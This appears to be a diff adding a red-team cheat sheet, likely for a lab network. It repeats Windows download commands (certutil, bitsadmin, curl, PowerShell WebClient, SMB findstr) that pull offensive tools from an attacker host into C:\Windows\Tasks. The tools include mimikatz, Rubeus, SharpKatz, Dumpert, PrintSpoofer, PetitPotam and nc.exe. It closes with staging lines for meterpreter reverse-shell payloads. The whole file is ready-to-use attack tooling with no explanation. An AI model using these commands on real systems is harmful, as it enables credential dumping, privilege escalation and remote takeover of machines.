+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PetitPotam.exe','c:\\windows\\tasks\PetitPotam.exe')./command.sh [screenname] get_petitpotam
+## Rubeus.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/Rubeus.exe Rubeus.exe
+cmd.exe /c curl http://10.10.14.3/tools/Rubeus.exe -o C:\Windows\Tasks\Rubeus.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/Rubeus.exe c:\\windows\\tasks\Rubeus.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\Rubeus.exe > c:\windows\\tasks\Rubeus.exe
+powershell iwr -uri http://10.10.14.3/tools/Rubeus.exe -o c:\windows\\tasks\Rubeus.exe
+powershell wget http://10.10.14.3/tools/Rubeus.exe -o c:\windows\\tasks\Rubeus.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/Rubeus.exe','c:\\windows\\tasks\Rubeus.exe')./command.sh [screenname] get_rubeus
+## PsExec64.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/PsExec64.exe PsExec64.exe
+cmd.exe /c curl http://10.10.14.3/tools/PsExec64.exe -o C:\Windows\Tasks\PsExec64.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/PsExec64.exe c:\\windows\\tasks\PsExec64.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\PsExec64.exe > c:\windows\\tasks\PsExec64.exe
+powershell iwr -uri http://10.10.14.3/tools/PsExec64.exe -o c:\windows\\tasks\PsExec64.exe
+powershell wget http://10.10.14.3/tools/PsExec64.exe -o c:\windows\\tasks\PsExec64.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PsExec64.exe','c:\\windows\\tasks\PsExec64.exe')./command.sh [screenname] get_psexec64
+## SharpKatz.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SharpKatz.exe SharpKatz.exe
+cmd.exe /c curl http://10.10.14.3/tools/SharpKatz.exe -o C:\Windows\Tasks\SharpKatz.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SharpKatz.exe c:\\windows\\tasks\SharpKatz.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SharpKatz.exe > c:\windows\\tasks\SharpKatz.exe
+powershell iwr -uri http://10.10.14.3/tools/SharpKatz.exe -o c:\windows\\tasks\SharpKatz.exe
+powershell wget http://10.10.14.3/tools/SharpKatz.exe -o c:\windows\\tasks\SharpKatz.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SharpKatz.exe','c:\\windows\\tasks\SharpKatz.exe')./command.sh [screenname] get_sharpkatz
+## nc.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/nc.exe nc.exe
+cmd.exe /c curl http://10.10.14.3/tools/nc.exe -o C:\Windows\Tasks\nc.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/nc.exe c:\\windows\\tasks\nc.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\nc.exe > c:\windows\\tasks\nc.exe
+powershell iwr -uri http://10.10.14.3/tools/nc.exe -o c:\windows\\tasks\nc.exe
+powershell wget http://10.10.14.3/tools/nc.exe -o c:\windows\\tasks\nc.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/nc.exe','c:\\windows\\tasks\nc.exe')./command.sh [screenname] get_nc
+## netscan.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/netscan.exe netscan.exe
+cmd.exe /c curl http://10.10.14.3/tools/netscan.exe -o C:\Windows\Tasks\netscan.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/netscan.exe c:\\windows\\tasks\netscan.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\netscan.exe > c:\windows\\tasks\netscan.exe
+powershell iwr -uri http://10.10.14.3/tools/netscan.exe -o c:\windows\\tasks\netscan.exe
+powershell wget http://10.10.14.3/tools/netscan.exe -o c:\windows\\tasks\netscan.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/netscan.exe','c:\\windows\\tasks\netscan.exe')./command.sh [screenname] get_netscan
+## SharpSQL.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SharpSQL.exe SharpSQL.exe
+cmd.exe /c curl http://10.10.14.3/tools/SharpSQL.exe -o C:\Windows\Tasks\SharpSQL.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SharpSQL.exe c:\\windows\\tasks\SharpSQL.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SharpSQL.exe > c:\windows\\tasks\SharpSQL.exe
+powershell iwr -uri http://10.10.14.3/tools/SharpSQL.exe -o c:\windows\\tasks\SharpSQL.exe
+powershell wget http://10.10.14.3/tools/SharpSQL.exe -o c:\windows\\tasks\SharpSQL.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SharpSQL.exe','c:\\windows\\tasks\SharpSQL.exe')./command.sh [screenname] get_sharpsql
+## PsBypassCLM.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/PsBypassCLM.exe PsBypassCLM.exe
+cmd.exe /c curl http://10.10.14.3/tools/PsBypassCLM.exe -o C:\Windows\Tasks\PsBypassCLM.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/PsBypassCLM.exe c:\\windows\\tasks\PsBypassCLM.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\PsBypassCLM.exe > c:\windows\\tasks\PsBypassCLM.exe
+powershell iwr -uri http://10.10.14.3/tools/PsBypassCLM.exe -o c:\windows\\tasks\PsBypassCLM.exe
+powershell wget http://10.10.14.3/tools/PsBypassCLM.exe -o c:\windows\\tasks\PsBypassCLM.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PsBypassCLM.exe','c:\\windows\\tasks\PsBypassCLM.exe')./command.sh [screenname] get_psbypassclm
+## PrintSpoofer32.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/PrintSpoofer32.exe PrintSpoofer32.exe
+cmd.exe /c curl http://10.10.14.3/tools/PrintSpoofer32.exe -o C:\Windows\Tasks\PrintSpoofer32.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/PrintSpoofer32.exe c:\\windows\\tasks\PrintSpoofer32.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\PrintSpoofer32.exe > c:\windows\\tasks\PrintSpoofer32.exe
+powershell iwr -uri http://10.10.14.3/tools/PrintSpoofer32.exe -o c:\windows\\tasks\PrintSpoofer32.exe
+powershell wget http://10.10.14.3/tools/PrintSpoofer32.exe -o c:\windows\\tasks\PrintSpoofer32.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PrintSpoofer32.exe','c:\\windows\\tasks\PrintSpoofer32.exe')./command.sh [screenname] get_printspoofer32
+## Loader.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/Loader.exe Loader.exe
+cmd.exe /c curl http://10.10.14.3/tools/Loader.exe -o C:\Windows\Tasks\Loader.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/Loader.exe c:\\windows\\tasks\Loader.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\Loader.exe > c:\windows\\tasks\Loader.exe
+powershell iwr -uri http://10.10.14.3/tools/Loader.exe -o c:\windows\\tasks\Loader.exe
+powershell wget http://10.10.14.3/tools/Loader.exe -o c:\windows\\tasks\Loader.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/Loader.exe','c:\\windows\\tasks\Loader.exe')./command.sh [screenname] get_loader
+## spool.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/spool.exe spool.exe
+cmd.exe /c curl http://10.10.14.3/tools/spool.exe -o C:\Windows\Tasks\spool.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/spool.exe c:\\windows\\tasks\spool.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\spool.exe > c:\windows\\tasks\spool.exe
+powershell iwr -uri http://10.10.14.3/tools/spool.exe -o c:\windows\\tasks\spool.exe
+powershell wget http://10.10.14.3/tools/spool.exe -o c:\windows\\tasks\spool.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/spool.exe','c:\\windows\\tasks\spool.exe')./command.sh [screenname] get_spool
+## mimikatz.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/mimikatz.exe mimikatz.exe
+cmd.exe /c curl http://10.10.14.3/tools/mimikatz.exe -o C:\Windows\Tasks\mimikatz.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/mimikatz.exe c:\\windows\\tasks\mimikatz.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\mimikatz.exe > c:\windows\\tasks\mimikatz.exe
+powershell iwr -uri http://10.10.14.3/tools/mimikatz.exe -o c:\windows\\tasks\mimikatz.exe
+powershell wget http://10.10.14.3/tools/mimikatz.exe -o c:\windows\\tasks\mimikatz.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/mimikatz.exe','c:\\windows\\tasks\mimikatz.exe')./command.sh [screenname] get_mimikatz
+## Outflank-Dumpert.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/Outflank-Dumpert.exe Outflank-Dumpert.exe
+cmd.exe /c curl http://10.10.14.3/tools/Outflank-Dumpert.exe -o C:\Windows\Tasks\Outflank-Dumpert.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/Outflank-Dumpert.exe c:\\windows\\tasks\Outflank-Dumpert.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\Outflank-Dumpert.exe > c:\windows\\tasks\Outflank-Dumpert.exe
+powershell iwr -uri http://10.10.14.3/tools/Outflank-Dumpert.exe -o c:\windows\\tasks\Outflank-Dumpert.exe
+powershell wget http://10.10.14.3/tools/Outflank-Dumpert.exe -o c:\windows\\tasks\Outflank-Dumpert.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/Outflank-Dumpert.exe','c:\\windows\\tasks\Outflank-Dumpert.exe')./command.sh [screenname] get_outflank-dumpert
+## MS-RPRN.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/MS-RPRN.exe MS-RPRN.exe
+cmd.exe /c curl http://10.10.14.3/tools/MS-RPRN.exe -o C:\Windows\Tasks\MS-RPRN.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/MS-RPRN.exe c:\\windows\\tasks\MS-RPRN.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\MS-RPRN.exe > c:\windows\\tasks\MS-RPRN.exe
+powershell iwr -uri http://10.10.14.3/tools/MS-RPRN.exe -o c:\windows\\tasks\MS-RPRN.exe
+powershell wget http://10.10.14.3/tools/MS-RPRN.exe -o c:\windows\\tasks\MS-RPRN.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/MS-RPRN.exe','c:\\windows\\tasks\MS-RPRN.exe')./command.sh [screenname] get_ms-rprn
+## winPEASx64.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/winPEASx64.exe winPEASx64.exe
+cmd.exe /c curl http://10.10.14.3/tools/winPEASx64.exe -o C:\Windows\Tasks\winPEASx64.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/winPEASx64.exe c:\\windows\\tasks\winPEASx64.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\winPEASx64.exe > c:\windows\\tasks\winPEASx64.exe
+powershell iwr -uri http://10.10.14.3/tools/winPEASx64.exe -o c:\windows\\tasks\winPEASx64.exe
+powershell wget http://10.10.14.3/tools/winPEASx64.exe -o c:\windows\\tasks\winPEASx64.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/winPEASx64.exe','c:\\windows\\tasks\winPEASx64.exe')./command.sh [screenname] get_winpeasx64
+## PingCastle.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/PingCastle.exe PingCastle.exe
+cmd.exe /c curl http://10.10.14.3/tools/PingCastle.exe -o C:\Windows\Tasks\PingCastle.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/PingCastle.exe c:\\windows\\tasks\PingCastle.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\PingCastle.exe > c:\windows\\tasks\PingCastle.exe
+powershell iwr -uri http://10.10.14.3/tools/PingCastle.exe -o c:\windows\\tasks\PingCastle.exe
+powershell wget http://10.10.14.3/tools/PingCastle.exe -o c:\windows\\tasks\PingCastle.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PingCastle.exe','c:\\windows\\tasks\PingCastle.exe')./command.sh [screenname] get_pingcastle
+## SpoolSample.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SpoolSample.exe SpoolSample.exe
+cmd.exe /c curl http://10.10.14.3/tools/SpoolSample.exe -o C:\Windows\Tasks\SpoolSample.exe
+bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.14.3/tools/SpoolSample.exe c:\\windows\\tasks\SpoolSample.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+findstr /V /L W3AllLov3LolBas \\\\10.10.14.3\share\\tools\SpoolSample.exe > c:\windows\\tasks\SpoolSample.exe
+powershell iwr -uri http://10.10.14.3/tools/SpoolSample.exe -o c:\windows\\tasks\SpoolSample.exe
+powershell wget http://10.10.14.3/tools/SpoolSample.exe -o c:\windows\\tasks\SpoolSample.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SpoolSample.exe','c:\\windows\\tasks\SpoolSample.exe')./command.sh [screenname] get_spoolsample
+
+## PrinSpoofer64.exe 
+certutil -urlcache -split -f http://10.10.14.3/tools/PrintSpoofer64.exe print.exe
+./command.sh [screenname] printspoofer
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/PrintSpoofer64.exe','c:\windows\tasks\print.exe')
+./command.sh [screenname] psprintspoofer
+./command.sh [screenname] psprintspooferrun
+## MimiKatz.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/mimi/mimikatz.exe mimi.exe
+./command.sh [screenname] mimikatz
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/mimi/mimikatz.exe','c:\windows\tasks\mimi.exe')
+./command.sh [screenname] psmimikatz
+## SharpHound.exe
+certutil -urlcache -split -f http://10.10.14.3/tools/SharpHound.exe sharphound.exe
+./command.sh [screenname] sharphound
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SharpHound.exe','c:\windows\tasks\sharphound.exe')
+./command.sh [screenname] pssharphound
+./command.sh [screenname] pssharphoundrun
+## windows/x64/meterpreter TCP  443
+certutil -urlcache -split -f http://10.10.14.3/payloads/shell_meth.exe meth.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/payloads/shell_meth.exe','c:\windows\tasks\meth.exe')
+./command.sh [screenname] certutilmeth
+./command.sh [screenname] psmethrun
+## windows/x64/meterpreter TCP  8080
+certutil -urlcache -split -f http://10.10.14.3/payloads/meth8080.exe meth8080.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/payloads/meth8080.exe','c:\windows\tasks\meth8080.exe')
+## windows/x64/reverse_tcp TCP 443
+certutil -urlcache -split -f http://10.10.14.3/payloads/methtcp.exe methtcp.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/payloads/methtcp.exe','c:\windows\tasks\methtcp.exe')
+./command.sh [screenname] psmethtcp
+./command.sh [screenname] psmethtcprun
+IEX ()
+#METERPRETER (reverse_https)
